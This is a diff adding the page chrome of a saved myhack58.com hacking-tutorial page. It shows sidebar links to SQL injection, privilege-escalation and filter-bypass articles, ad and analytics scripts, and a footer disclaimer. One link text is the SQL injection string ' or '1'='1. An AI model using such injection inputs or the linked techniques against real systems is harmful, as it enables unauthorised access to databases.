+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/2010525162512679.png" 
+  width=102 height=72></A> 
+  <P><A title="phpcms2008sp4 最新sql注入" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/27035.htm" 
+  target=_blank>phpcms2008sp...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/27002.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/201052311625288.jpg" 
+  width=102 height=72></A> 
+  <P><A title="动网论坛PHPaspsky 2.0最新多处跨站漏洞" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/27002.htm" 
+  target=_blank>动网论坛PHPa...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/26851.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/20105512545156.jpg" 
+  width=102 height=72></A> 
+  <P><A title="SiteServer CMS多处跨站漏洞" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/26851.htm" 
+  target=_blank>SiteServer C...</A></P></LI></UL></DIV></DIV>
+<DIV class=sub>
+<DIV class=adv>
+<SCRIPT 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/fk.js"></SCRIPT>
+</DIV><!--广告250X250-->
+<DIV class=module>
+<DIV class=title>
+<DIV class=title_l>
+<H2>最近更新</H2></DIV></DIV>
+<UL class=list2>
+  <LI>· <A title="Echo 写入VBS提权" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28463.htm">Echo 
+  写入VBS提权</A> 
+  <LI>· <A title=MYSQL提权技巧 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28453.htm">MYSQL提权技巧</A> 
+  <LI>· <A title="foosun cms(风讯内容管理系统)建目录漏洞实践" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28427.htm">foosun 
+  cms(风讯内容管理系统</A> 
+  <LI>· <A title="sql server 启用xp_cmdshell 重启pcanywhere" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28426.htm">sql server 
+  启用xp_cmdshell </A>
+  <LI>· <A title=HTTP_X_FORWARDED_FOR伪造 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28414.htm">HTTP_X_FORWARDED_FOR伪造</A> 
+
+  <LI>· <A title=SQL注入eWebEditor数据库 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28403.htm">SQL注入eWebEditor数据库</A> 
+
+  <LI>· <A title="PHP SQL 注入攻击的技术实现以及预防办法" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28379.htm">PHP SQL 
+  注入攻击的技术实现以</A> 
+  <LI>· <A title=数据库导库技巧 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28377.htm">数据库导库技巧</A> 
+  <LI>· <A title=详解如何在postgresql中注入 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28351.htm">详解如何在postgresql中注入</A> 
+
+  <LI>· <A title=%69d分析绕过防注入 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28350.htm">%69d分析绕过防注入</A> 
+
+  <LI>· <A title=SQL另类注入之绕过后台登陆验证 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28349.htm">SQL另类注入之绕过后台登陆验</A> 
+
+  <LI>· <A title="Websniff -aspx网页嗅探工具及使用说明" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28319.htm">Websniff 
+  -aspx网页嗅探工具及</A> </LI></UL></DIV>
+<DIV class=module>
+<DIV class=title>
+<DIV class=title_l>
+<H2>推荐浏览</H2></DIV></DIV>
+<UL class=list2>
+  <LI>· <A title=SQL溢出新方法!!肉鸡不用愁!! 
+  href="http://www.myhack58.com/Article/html/3/7/2005/22.htm">SQL溢出新方法!!肉鸡不用愁!!</A> 
+
+  <LI>· <A title="SQL INJECTION的终极利器opendatasource和openrowset" 
+  href="http://www.myhack58.com/Article/html/3/7/2005/3715.htm">SQL 
+  INJECTION的终极利器open</A> 
+  <LI>· <A title=SQL注入－－入侵动网 
+  href="http://www.myhack58.com/Article/html/3/7/2006/10967.htm">SQL注入－－入侵动网</A> 
+
+  <LI>· <A title=Discuz存在SQL注入漏洞会员可提升权限 
+  href="http://www.myhack58.com/Article/html/3/7/2007/15287.htm">Discuz存在SQL注入漏洞会员可</A> 
+
+  <LI>· <A title="菜鸟也玩dvbbs 8.2 SQL注射漏洞" 
+  href="http://www.myhack58.com/Article/html/3/7/2008/19242.htm">菜鸟也玩dvbbs 8.2 
+  SQL注射漏</A> 
+  <LI>· <A title=菜鸟＋Sa＋注入工具组合＝肉鸡成群 
+  href="http://www.myhack58.com/Article/html/3/7/2006/6382.htm">菜鸟＋Sa＋注入工具组合＝肉鸡</A> 
+
+  <LI>· <A title=快速学习，理解.SQL注入技术 
+  href="http://www.myhack58.com/Article/html/3/7/2005/1859.htm">快速学习，理解.SQL注入技术</A> 
+
+  <LI>· <A title=Pangolin--你见过的最好的sql注入工具 
+  href="http://www.myhack58.com/Article/html/3/7/2008/18161.htm">Pangolin--你见过的最好的sql</A> 
+
+  <LI>· <A title="基于php+Mysql的SQL Injection 攻击技术" 
+  href="http://www.myhack58.com/Article/html/3/7/2006/11314.htm">基于php+Mysql的SQL 
+  Injectio</A> 
+  <LI>· <A title=利用注入漏洞获得密码 
+  href="http://www.myhack58.com/Article/html/3/7/2005/5697.htm">利用注入漏洞获得密码</A> 
+  <LI>· <A title="&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;等漏洞问题" 
+  href="http://www.myhack58.com/Article/html/3/7/2006/13073.htm">' or '1'='1</A> 
+
+  <LI>· <A title=动易2005的注入程序 
+  href="http://www.myhack58.com/Article/html/3/7/2006/8218.htm">动易2005的注入程序</A> 
+  </LI></UL></DIV></DIV></DIV>
+<DIV class=box10></DIV>
+<DIV id=ad_index_bottom class=grid-3>
+<SCRIPT 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/indexfoot.js"></SCRIPT>
+</DIV>
+<DIV class=box10></DIV><!--广告--><!-- 网站底部模版 -->
+<DIV id=footer class=grid-3>
+<UL>
+  <LI><A href="http://www.myhack58.com/support/about.asp" target=_blank>关于我们</A> 
+  <EM>|</EM> </LI>
+  <LI><A href="http://www.myhack58.com/support/declare.asp" 
+  target=_blank>免责声明</A> <EM>|</EM> </LI>
+  <LI><A href="http://www.myhack58.com/support/advertise.asp" 
+  target=_blank>广告服务</A> <EM>|</EM> </LI>
+  <LI><A href="http://www.myhack58.com/sitemap.html" target=_blank>网站地图</A> 
+  <EM>|</EM> </LI>
+  <LI><A href="http://bbs.myhack58.com/read.php?tid-281886.html" 
+  target=_blank>招贤纳士</A> <EM>|</EM> </LI>
+  <LI><A href="mailto:admin@myhack58.com" target=_blank>联系我们</A> <EM>|</EM> 
+</LI>
+  <LI><A href="http://bbs.myhack58.com/read.php?tid-239829.html" 
+  target=_blank>赞助本站</A> </LI></UL>
+<P class=clear>工信部网站备案号：皖ICP备10017209号</P>
+<P class=clear><A href="http://www.itlaw.com.cn/" rel=nofollow 
+target=_blank>网站法律顾问：庄毅雄律师</A></P>
+<P class=clear>本站通过多款杀毒软件等安全工具检测无毒无害请大家放心浏览</P>
+<P class=clear>本站内容来自于互联网,仅适于网络安全技术爱好者学习研究使用，学习中请遵循国家相关法律法规</P>
+<P 
+class=clear>黑吧安全网尊重并保护知识产权，根据最新颁布的《信息网络传播权保护条例》如果您认为内容侵犯了您的权利，请书面告知，本站将删除相关链接</P>
+<P class=clear>Copyright &copy; 2002 - 2012 myhack58.com All Rights Reserved</P>
+<P class=clear>
+<SCRIPT type=text/javascript>     var locationUrl = escape(document.location.href);     document.write(unescape("%3Cscript")+" charset='utf-8' src='http://union.rising.com.cn//InfoManage/TrojanInspect.aspx?p1=XNk3xHG5v8vg/xSQ21tqPg-Kz/KYcK6lk-L8J7yGGDA=&p2=ICufWbLA2J0=&p3=XNk3xHG5v8vg/xSQ21tqPrPQAsNlqo6f&url="+ locationUrl  + "' type='text/javascript'"+unescape("%3E%3C/script%3E"));</SCRIPT>
+</P></DIV></DIV>
+<SCRIPT type=text/javascript>
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F020d6208a1c666d9504e5a1eac65ed67' type='text/javascript'%3E%3C/script%3E"));
+</SCRIPT>
+</BODY></HTML>
